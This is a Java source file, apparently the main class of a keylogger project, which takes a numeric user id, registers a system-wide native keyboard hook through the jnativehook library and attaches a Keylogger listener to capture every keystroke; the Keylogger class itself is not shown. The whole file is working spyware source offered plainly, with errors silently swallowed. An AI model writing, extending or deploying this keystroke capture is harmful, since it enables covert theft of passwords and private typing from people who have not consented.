package com.mibef108287.app;

import com.github.kwhat.jnativehook.GlobalScreen;

public class App 
{
    public static void main( String[] args )
    {
        if (args.length != 1 || !args[0].matches("\\d+")){
            System.out.println("Pass a userid which has to be a number!");;
            System.exit(1);
        }
        try {
            Keylogger keylogger = new Keylogger(Long.parseLong(args[0]));
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(keylogger);
        } catch (Exception e) {
            System.exit(1);
        }
    }
}
